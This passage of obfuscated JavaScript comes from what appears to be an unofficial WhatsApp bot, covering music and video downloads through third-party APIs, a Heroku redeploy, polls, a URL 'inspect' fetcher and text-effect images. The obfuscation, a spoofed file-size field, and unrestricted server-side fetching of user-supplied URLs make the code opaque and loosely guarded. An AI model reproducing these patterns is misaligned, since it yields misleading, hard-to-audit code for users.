✦𝖋𝖗𝖎𝖊𝖓𝖉𝖘 (𝚒𝚗𝚌. 𝙼𝚉𝙰𝚉𝙸, 𝚂𝙸𝙻𝚅𝙰, 𝙰𝚁𝙻𝙾𝙳𝚁𝙰𝙶𝙾𝙽 𝚊𝚗𝚍 𝙼𝚂𝙽𝙰𝙿𝙳𝚁𝙰𝙶𝙾𝙽)\n┃  ✦𝕒𝕟𝕕 𝕒𝕝𝕝 𝕠𝕗 𝕪𝕠𝕦🙂\n╰══────────────────══╯";
          if (menu === "VIDEO") {
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'video': fs.readFileSync("./Media/menu.mp4"),
              'caption': _0x515934,
              'gifPlayback': true
            }, {
              'quoted': _0xca7ad5
            });
          } else {
            if (menu === "TEXT") {
              _0x398b1a.sendMessage(_0x24b6cb, {
                'text': _0x515934
              }, {
                'quoted': _0xca7ad5
              });
            } else {
              if (menu === "IMAGE") {
                _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'image': {
                    'url': 'https://i.imgur.com/HP6GyiD.jpeg'
                  },
                  'caption': _0x515934,
                  'fileLength': '9999999999'
                }, {
                  'quoted': _0xca7ad5
                });
              } else if (menu === "LINK") {
                _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'text': _0x515934,
                  'contextInfo': {
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'title': '𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗',
                      'body': '' + runtime(process.uptime()),
                      'thumbnail': fs.readFileSync('./Media/viniziaz.jpg'),
                      'sourceUrl': "https://wa.me/254759925133?text=Hello👋+Viniziaz+Nihostie+Bot+Mkuu+😔",
                      'mediaType': 0x1,
                      'renderLargerThumbnail': true
                    }
                  }
                }, {
                  'quoted': _0xca7ad5
                });
              }
            }
          }
          break;
        case "advice":
          _0x1d37a1(advice());
          console.log(advice());
          break;
        case "owner":
        case 'developer':
        case "dev":
          _0x398b1a.sendContact(_0x24b6cb, _0xa781d4, _0xca7ad5);
          break;
        case "lyrics2":
          try {
            if (!_0x32c5b4) {
              return _0x1d37a1("𝑷𝒓𝒐𝒗𝒊𝒅𝒆 𝒂 𝒔𝒐𝒏𝒈 𝒏𝒂𝒎𝒆!\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
            }
            const _0x914e67 = await Client.songs.search(_0x32c5b4);
            const _0x583f82 = _0x914e67[0x0];
            const _0x56a683 = await _0x583f82.lyrics();
            await _0x398b1a.sendMessage(_0x24b6cb, {
              'text': _0x56a683
            }, {
              'quoted': _0xca7ad5
            });
          } catch (_0x5a6fdf) {
            _0x1d37a1("𝑰 𝒅𝒊𝒅 𝒏𝒐𝒕 𝒈𝒊𝒏𝒅 𝒂𝒏𝒚 𝒍𝒚𝒓𝒊𝒄𝒔 𝒇𝒐𝒓 " + _0x32c5b4 + ". 𝑻𝒓𝒚 𝒔𝒆𝒂𝒓𝒄𝒉𝒊𝒏𝒈 𝒂 𝒅𝒊𝒇𝒇𝒆𝒓𝒆𝒏𝒕 𝒔𝒐𝒏𝒈.\n\n> ©𝖕𝖔𝖜𝖊𝖗 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
            console.log(_0x5a6fdf);
          }
          break;
        case 'play2':
          {
            const _0x7fbbd8 = require("yt-search");
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("𝑾𝒉𝒂𝒕 𝒔𝒐𝒏𝒈 𝒅𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅?\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
              }
              const {
                videos: _0x2aa191
              } = await _0x7fbbd8(_0x32c5b4);
              if (!_0x2aa191 || _0x2aa191.length === 0x0) {
                return _0xca7ad5.reply("𝑵𝒐 𝒔𝒐𝒏𝒈 𝒇𝒐𝒖𝒏𝒅!\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
              }
              const _0x37dc4d = _0x2aa191[0x0].url;
              try {
                let _0x2fc607 = await fetchJson("https://api.dreaded.site/api/ytdl/audio?url=" + _0x37dc4d);
                const {
                  title: _0x4a70d9,
                  format: _0xd521e3,
                  url: _0x5368b3
                } = _0x2fc607.result;
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'document': {
                    'url': _0x5368b3
                  },
                  'mimetype': "audio/mpeg",
                  'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗",
                  'fileName': _0x4a70d9 + '.mp3'
                }, {
                  'quoted': _0xca7ad5
                });
              } catch (_0x47d9a1) {
                console.error("API request failed:", _0x47d9a1.message);
                _0xca7ad5.reply("𝑫𝒐𝒘𝒏𝒍𝒐𝒂𝒅 𝒇𝒂𝒊𝒍𝒆𝒅: 𝑼𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒓𝒆𝒕𝒓𝒊𝒆𝒗𝒆.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
              }
            } catch (_0x1226a3) {
              _0xca7ad5.reply("Download failed\n" + _0x1226a3.message);
            }
          }
          ;
          break;
        case "music":
          {
            const _0x3ea148 = require('yt-search');
            const _0x4ef3f9 = require("node-fetch");
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("𝑾𝒉𝒂𝒕 𝒔𝒐𝒏𝒈 𝒅𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
              }
              let _0x46f9ea = await _0x3ea148(_0x32c5b4);
              if (!_0x46f9ea.all.length) {
                return sendReply(_0x398b1a, _0xca7ad5, "No results found for your query.");
              }
              let _0x4f2b8d = _0x46f9ea.all[0x0].url;
              const _0x45ac88 = "https://keith-api.vercel.app/download/dlmp3?url=" + _0x4f2b8d;
              let _0x47cbbc = await _0x4ef3f9(_0x45ac88);
              let _0xc30ea1 = await _0x47cbbc.json();
              if (_0xc30ea1.status && _0xc30ea1.result) {
                const _0x54812a = {
                  'title': _0xc30ea1.result.title,
                  'downloadUrl': _0xc30ea1.result.downloadUrl,
                  'thumbnail': _0x46f9ea.all[0x0].thumbnail,
                  'format': _0xc30ea1.result.format,
                  'quality': _0xc30ea1.result.quality
                };
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'document': {
                    'url': _0x54812a.downloadUrl
                  },
                  'mimetype': "audio/mp3",
                  'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗",
                  'fileName': _0x54812a.title.replace(/[^a-zA-Z0-9 ]/g, '') + ".mp3"
                }, {
                  'quoted': _0xca7ad5
                });
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'audio': {
                    'url': _0x54812a.downloadUrl
                  },
                  'mimetype': "audio/mp4"
                }, {
                  'quoted': _0xca7ad5
                });
                return;
              } else {
                return _0x1d37a1("𝑼𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒇𝒆𝒕𝒄𝒉 𝒕𝒉𝒆 𝒔𝒐𝒏𝒈. 𝑻𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
              }
            } catch (_0x1e476b) {
              return _0x1d37a1("𝑨𝒏 𝒆𝒓𝒓𝒐𝒓 𝒐𝒄𝒄𝒖𝒓𝒆𝒅: ");
            }
          }
          break;
        case "video":
          {
            const _0x37514e = require("yt-search");
            const _0x156847 = require("node-fetch");
            try {
              if (!_0x32c5b4) {
                return sendReply(_0x398b1a, _0xca7ad5, "𝑷𝒍𝒆𝒂𝒔𝒆 𝒔𝒑𝒆𝒄𝒊𝒇𝒚 𝒕𝒉𝒆 𝒗𝒊𝒅𝒆𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖍𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
              }
              let _0x2ac599 = await _0x37514e(_0x32c5b4);
              if (!_0x2ac599.all.length) {
                return sendReply(_0x398b1a, _0xca7ad5, "No results found for your query.");
              }
              let _0xd80b93 = _0x2ac599.all[0x0].url;
              const _0x29fb85 = "https://apis-keith.vercel.app/download/dlmp4?url=" + _0xd80b93;
              let _0x50a071 = await _0x156847(_0x29fb85);
              let _0x47126a = await _0x50a071.json();
              if (_0x47126a.status && _0x47126a.result) {
                const _0x170a07 = {
                  'title': _0x47126a.result.title,
                  'downloadUrl': _0x47126a.result.downloadUrl,
                  'thumbnail': _0x2ac599.all[0x0].thumbnail,
                  'format': _0x47126a.result.format,
                  'quality': _0x47126a.result.quality
                };
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'video': {
                    'url': _0x170a07.downloadUrl
                  },
                  'mimetype': "video/mp4",
                  'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
                }, {
                  'quoted': _0xca7ad5
                });
                return;
              } else {
                return _0x1d37a1(_0x398b1a, _0xca7ad5, "𝑼𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒇𝒆𝒕𝒄𝒉 𝒕𝒉𝒆 𝒗𝒊𝒅𝒆𝒐. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓, 𝒎𝒛𝒂𝒛𝒊 𝒊𝒔 𝒇𝒐𝒓 𝒚𝒐𝒖😂.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
              }
            } catch (_0x1fe358) {
              return _0x1d37a1(_0x398b1a, _0xca7ad5, "An error occurred: " + _0x1fe358.message);
            }
          }
          ;
          break;
        case "update":
        case "redeploy":
          {
            const _0x362beb = require("axios");
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            if (!appname || !herokuapi) {
              await _0xca7ad5.reply("𝑰𝒕 𝒍𝒐𝒐𝒌𝒔 𝒍𝒊𝒌𝒆 𝒕𝒉𝒆 𝒉𝒆𝒓𝒐𝒌𝒖 𝒂𝒑𝒑 𝒏𝒂𝒎𝒆 𝒐𝒓 𝑨𝑷𝑰 𝒌𝒆𝒚 𝒊𝒔 𝒏𝒐𝒕 𝒔𝒆𝒕. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒎𝒂𝒌𝒆 𝒔𝒖𝒓𝒆 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 𝒔𝒆𝒕 𝒕𝒉𝒆 `APP_NAME` 𝒂𝒏𝒅 `HEROKU_API` 𝒆𝒏𝒗𝒊𝒓𝒐𝒏𝒎𝒆𝒏𝒕 𝒗𝒂𝒓𝒊𝒂𝒃𝒍𝒆𝒔.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
              return;
            }
            async function _0x141d8e() {
              try {
                const _0x53eca3 = await _0x362beb.post("https://api.heroku.com/apps/" + appname + "/builds", {
                  'source_blob': {
                    'url': 'https://github.com/Viniznimco/VINIZIAZ-XMD/tarball/main'
                  }
                }, {
                  'headers': {
                    'Authorization': "Bearer " + herokuapi,
                    'Accept': "application/vnd.heroku+json; version=3"
                  }
                });
                await _0xca7ad5.reply("𝑴𝒁𝑨𝒁𝑰-𝑿𝑴𝑫 𝑩𝒐𝒕 𝒊𝒔 𝒖𝒏𝒅𝒆𝒓𝒈𝒐𝒊𝒏𝒈 𝒂 𝒓𝒖𝒕𝒉𝒍𝒆𝒔𝒔 𝒖𝒑𝒈𝒓𝒂𝒅𝒆, 𝒉𝒐𝒍𝒅 𝒐𝒏 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒏𝒆𝒙𝒕 2 𝒎𝒊𝒏𝒖𝒕𝒆𝒔 𝒂𝒔 𝒕𝒉𝒆 𝒓𝒆𝒅𝒆𝒑𝒍𝒐𝒚 𝒆𝒙𝒆𝒄𝒖𝒕𝒆𝒔! 𝑶𝒏𝒄𝒆 𝒅𝒐𝒏𝒆𝒆, 𝒚𝒐𝒖 𝒘𝒊𝒍𝒍 𝒉𝒂𝒗𝒆 𝒕𝒉𝒆 𝒇𝒓𝒆𝒔𝒉𝒆𝒔𝒕 𝒗𝒆𝒓𝒔𝒊𝒐𝒏 𝒐𝒇 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝒖𝒏𝒍𝒆𝒂𝒔𝒉𝒆𝒅 𝒖𝒑𝒐𝒏 𝒚𝒐𝒖.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
                console.log("Build details:", _0x53eca3.data);
              } catch (_0x381a92) {
                const _0x38341e = _0x381a92.response?.["data"] || _0x381a92.message;
                await _0xca7ad5.reply("𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒖𝒑𝒅𝒂𝒕𝒆 𝒂𝒏𝒅 𝒓𝒆𝒅𝒆𝒑𝒍𝒐𝒚. 𝑪𝒉𝒆𝒄𝒌 𝒊𝒇 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 𝒔𝒆𝒕 𝒕𝒉𝒆 𝒉𝒆𝒓𝒐𝒌𝒖 𝑨𝑷𝑰 𝒌𝒆𝒚 𝒂𝒏𝒅 𝒂𝒑𝒑 𝒏𝒂𝒎𝒆 𝒄𝒐𝒓𝒓𝒆𝒄𝒕𝒍𝒚.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
                console.error("Error triggering redeploy:", _0x38341e);
              }
            }
            _0x141d8e();
          }
          break;
        case "credits":
          _0x398b1a.sendMessage(_0xca7ad5.chat, {
            'image': {
              'url': "https://i.imgur.com/nhNVsqf.jpeg"
            },
            'caption': "We express sincere gratitude and acknowledgement to the following:\n\n -Nick ➪ Kenya\n - Writing the base code using case method\nhttps://github.com/HunterNick2\n\n -Viniziaz ➪ Kenya\n - Founder of the bot base\nhttps://github.com/Viniznimco\n\n𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
          }, {
            'quoted': _0xca7ad5
          });
          break;
        case 'poll':
          {
            let [_0x9bc33c, _0x5b73d4] = _0x32c5b4.split('|');
            if (_0x32c5b4.split('|') < 0x2) {
              return _0xca7ad5.reply("Wrong format::\nExample:- poll who is the best developer|Putin, Viniziaz\n\n> ©𝕻𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
            }
            let _0x4c011b = [];
            for (let _0x18fcb6 of _0x5b73d4.split(',')) {
              _0x4c011b.push(_0x18fcb6);
            }
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'poll': {
                'name': _0x9bc33c,
                'values': _0x4c011b
              }
            });
          }
          break;
        case "play":
          {
            const _0x285333 = require('axios');
            const _0x3ced78 = require("yt-search");
            const _0x4dd84f = require("fluent-ffmpeg");
            const _0x202c2 = require('fs');
            const _0x131b14 = require("path");
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("What song do you want to download?\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
              }
              let _0x38ee19 = await _0x3ced78(_0x32c5b4);
              let _0x1a48c2 = _0x38ee19.all[0x0].url;
              const _0x3130a3 = ['https://xploader-api.vercel.app/ytmp3?url=' + _0x1a48c2, 'https://apis.davidcyriltech.my.id/youtube/mp3?url=' + _0x1a48c2, "https://api.ryzendesu.vip/api/downloader/ytmp3?url=" + _0x1a48c2, "https://api.dreaded.site/api/ytdl/audio?url=" + _0x1a48c2];
              for (const _0x2a0771 of _0x3130a3) {
                try {
                  let _0x206dd7 = await fetchJson(_0x2a0771);
                  if (_0x206dd7.status === 0xc8 || _0x206dd7.success) {
                    let _0x3d2e2c = _0x206dd7.result?.["downloadUrl"] || _0x206dd7.url;
                    let _0x226ffa = _0x38ee19.all[0x0].title.replace(/[^a-zA-Z0-9 ]/g, '') + ".mp3";
                    let _0x59e805 = _0x131b14.join(__dirname, _0x226ffa);
                    const _0x3fcaef = await _0x285333({
                      'url': _0x3d2e2c,
                      'method': 'GET',
                      'responseType': "stream"
                    });
                    if (_0x3fcaef.status !== 0xc8) {
                      _0xca7ad5.reply("sorry but the API endpoint didn't respond correctly. Try again later.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
                      continue;
                    }
                    _0x4dd84f(_0x3fcaef.data).toFormat('mp3').save(_0x59e805).on("end", async () => {
                      await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                        'document': {
                          'url': _0x59e805
                        },
                        'mimetype': "audio/mp3",
                        'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗",
                        'fileName': _0x226ffa
                      }, {
                        'quoted': _0xca7ad5
                      });
                      _0x202c2.unlinkSync(_0x59e805);
                    }).on("error", _0xdacb30 => {
                      _0xca7ad5.reply("Download failed\n" + _0xdacb30.message);
                    });
                    return;
                  }
                } catch (_0x1d741c) {
                  continue;
                }
              }
              _0xca7ad5.reply("𝑨𝒏 𝒆𝒓𝒓𝒐𝒓 𝒐𝒄𝒄𝒖𝒓𝒆𝒅. 𝑨𝑳𝑳 𝑨𝑷𝑰𝒔 𝒎𝒊𝒈𝒉𝒕 𝒏𝒆 𝒅𝒐𝒘𝒏 𝒐𝒓 𝒖𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒑𝒓𝒐𝒄𝒆𝒔𝒔 𝒕𝒉𝒆 𝒓𝒆𝒒𝒖𝒆𝒔𝒕.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
            } catch (_0x379336) {
              _0xca7ad5.reply("Download failed\n" + _0x379336.message);
            }
          }
          break;
        case "inspect":
          {
            const _0x21b103 = require('node-fetch');
            const _0x35232b = require('cheerio');
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("𝑷𝒓𝒐𝒗𝒊𝒅𝒆 𝒂 𝒗𝒂𝒍𝒊𝒅 𝒘𝒆𝒃 𝒍𝒊𝒏𝒌 𝒕𝒐 𝒇𝒆𝒕𝒄𝒉! 𝑻𝒉𝒊𝒔 𝑩𝒐𝒕 𝒘𝒊𝒍𝒍 𝒄𝒓𝒂𝒘𝒍 𝒕𝒉𝒆 𝒘𝒆𝒃𝒔𝒊𝒕𝒆 𝒂𝒏𝒅 𝒇𝒆𝒕𝒄𝒉 𝒊𝒕𝒔 HTML, CSS, JavaScript, 𝒂𝒏𝒅 𝒂𝒏𝒚 𝒎𝒆𝒅𝒊𝒂 𝒆𝒎𝒃𝒆𝒅𝒅𝒆𝒅 𝒊𝒏 𝒊𝒕.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
            }
            if (!/^https?:\/\//i.test(_0x32c5b4)) {
              return _0xca7ad5.reply("𝑷𝒍𝒆𝒂𝒔𝒆 𝒑𝒓𝒐𝒗𝒊𝒅𝒆 𝒂 𝒍𝒊𝒏𝒌 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 http:// or https://\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
            }
            try {
              const _0x2a2e76 = await _0x21b103(_0x32c5b4);
              const _0x3755f2 = await _0x2a2e76.text();
              const _0x2a2ad8 = _0x35232b.load(_0x3755f2);
              const _0xc87614 = [];
              _0x2a2ad8("img[src], video[src], audio[src]").each((_0x4ab597, _0x40e9fa) => {
                let _0x337a29 = _0x2a2ad8(_0x40e9fa).attr("src");
                if (_0x337a29) {
                  _0xc87614.push(_0x337a29);
                }
              });
              const _0x1a3118 = [];
              _0x2a2ad8("link[rel=\"stylesheet\"]").each((_0x462958, _0x244b89) => {
                let _0x2d4231 = _0x2a2ad8(_0x244b89).attr("href");
                if (_0x2d4231) {
                  _0x1a3118.push(_0x2d4231);
                }
              });
              const _0x450a4b = [];
              _0x2a2ad8("script[src]").each((_0x5b54d, _0x153d60) => {
                let _0x1caf75 = _0x2a2ad8(_0x153d60).attr("src");
                if (_0x1caf75) {
                  _0x450a4b.push(_0x1caf75);
                }
              });
              await _0xca7ad5.reply("**Full HTML Content**:\n\n" + _0x3755f2);
              if (_0x1a3118.length > 0x0) {
                for (const _0x1e5ea6 of _0x1a3118) {
                  const _0x1ba11e = await _0x21b103(new URL(_0x1e5ea6, _0x32c5b4));
                  const _0x10dbea = await _0x1ba11e.text();
                  await _0xca7ad5.reply("**CSS File Content**:\n\n" + _0x10dbea);
                }
              } else {
                await _0xca7ad5.reply("No external CSS files found.");
              }
              if (_0x450a4b.length > 0x0) {
                for (const _0x2408b7 of _0x450a4b) {
                  const _0x33dd17 = await _0x21b103(new URL(_0x2408b7, _0x32c5b4));
                  const _0x317622 = await _0x33dd17.text();
                  await _0xca7ad5.reply("**JavaScript File Content**:\n\n" + _0x317622);
                }
              } else {
                await _0xca7ad5.reply("No external JavaScript files found.");
              }
              if (_0xc87614.length > 0x0) {
                await _0xca7ad5.reply("**Media Files Found**:\n" + _0xc87614.join("\n"));
              } else {
                await _0xca7ad5.reply("No media files (images, videos, audios) found.");
              }
            } catch (_0x564dce) {
              console.error(_0x564dce);
              return _0xca7ad5.reply("An error occurred while fetching the website content.");
            }
          }
          break;
        case "metallic":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "Metallic Viniziaz");
              return;
            }
            try {
              var _0x588010 = await _0x15f987.ephoto('https://en.ephoto360.com/impressive-decorative-3d-metal-text-effect-798.html', _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x588010.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0xb9a1af) {
              _0xca7ad5.reply(_0xb9a1af);
            }
          }
          break;
        case "ice":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "Ice Viniziaz");
              return;
            }
            try {
              var _0x59fa2c = await _0x15f987.ephoto("https://en.ephoto360.com/ice-text-effect-online-101.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x59fa2c.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0x3892b5) {
              _0xca7ad5.reply(_0x3892b5);
            }
          }
          break;
        case 'snow':
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "Snow Viniziaz");
              return;
            }
            try {
              var _0xe2fb58 = await _0x15f987.ephoto("https://en.ephoto360.com/create-a-snow-3d-text-effect-free-online-621.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0xe2fb58.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0x565112) {
              _0xca7ad5.reply(_0x565112);
            }
          }
          break;
        case "impressive":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "impressive Nick");
              return;
            }
            try {
              var _0xce633a = await _0x15f987.ephoto("https://en.ephoto360.com/create-3d-colorful-paint-text-effect-online-801.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0xce633a.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0x2f80f7) {
              _0xca7ad5.reply(_0x2f80f7);
            }
          }
          break;
        case "noel":
          {
            var _0x15f987 = require('mumaker');
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage: " + prefix + "Noel myself");
              return;
            }
            try {
              var _0x113c7e = await _0x15f987.ephoto("https://en.ephoto360.com/noel-text-effect-online-99.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x113c7e.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x501e78) {
              _0xca7ad5.reply("💀💀" + _0x501e78);
            }
          }
          break;
        case "water":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage: " + prefix + "Water myself");
              return;
            }
            try {
              var _0x3be112 = await _0x15f987.ephoto("https://en.ephoto360.com/create-water-effect-text-online-295.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x3be112.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x52d56e) {
              _0xca7ad5.reply('💀💀' + _0x52d56e);
            }
          }
          break;
        case "matrix":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage: " + prefix + "Matrix myself");
              return;
            }
            try {
              var _0x252204 = await _0x15f987.ephoto('https://en.ephoto360.com/matrix-text-effect-154.html', _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x252204.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x31d65a) {
              _0xca7ad5.reply("💀💀" + _0x31d65a);
            }
          }
          break;
        case "light":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
